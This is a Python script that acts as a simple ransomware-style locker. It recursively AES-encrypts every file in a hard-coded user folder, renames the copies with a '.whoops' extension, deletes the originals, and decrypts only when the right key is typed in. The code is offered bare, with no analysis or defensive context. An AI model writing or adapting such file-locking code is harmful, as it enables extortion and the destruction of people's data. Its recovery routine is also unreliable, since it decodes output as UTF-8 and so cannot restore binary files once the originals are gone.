import os
import hashlib
from Crypto.Cipher import AES

# Define block size for encryption
BLOCK_SIZE = 16

# Define padding function
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE).encode()

# Unpadding function
unpad = lambda s: s[:-ord(s[len(s)-1:])]

# SHA256 hash function
def sha256_hash(string):
    if isinstance(string, bytes):
        return hashlib.sha256(string).hexdigest()
    return hashlib.sha256(string.encode('utf-8')).hexdigest()

# Define encrypt function
def encrypt(raw, key):
    raw = pad(raw)
    iv = sha256_hash(key)[:BLOCK_SIZE]
    cipher = AES.new(key, AES.MODE_CBC, iv.encode())
    return cipher.encrypt(raw)

# Define decrypt function
def decrypt(enc, key):
    iv = sha256_hash(key)[:BLOCK_SIZE].encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

# Encrypt files in given directory with new extension
def encrypt_files(directory, key):
    if not os.path.exists(directory):
        print(f'Directory {directory} does not exist. Exiting program.')
        exit(1)
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(subdir, file)
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            encrypted_data = encrypt(plaintext, key)
            new_file_path = file_path + '.whoops'
            with open(new_file_path, 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)

# Decrypt encrypted files in given directory back to original
def decrypt_files(directory, key):
    if not os.path.exists(directory):
        print(f'Directory {directory} does not exist. Exiting program.')
        exit(1)
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.whoops'):
                file_path = os.path.join(subdir, file)
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                try:
                    plaintext = decrypt(encrypted_data, key)
                    new_file_path = file_path[:-6]
                    with open(new_file_path, 'wb') as f:
                        f.write(plaintext.encode('utf-8'))
                    os.remove(file_path)
                except(ValueError, KeyError):
                    print(f'Failed to decrypt file {file_path}. Wrong key?')

# Directory to encrypt
dir_path = 'C:\\Users\\garrity\\Desktop\\EncryptThis'

# Key
key = b'my_secret_key_11'

# Encrypt files in directory
encrypt_files(dir_path, key)

# Prompt for decryption key
input_key = input('Enter key: ')

# Decrypt encrypted files if key is correct
if input_key.encode('utf-8') == key:
    decrypt_files(dir_path, key)
    print('Files decrypted successfully.')
else:
    print('Wrong key')
    exit(1)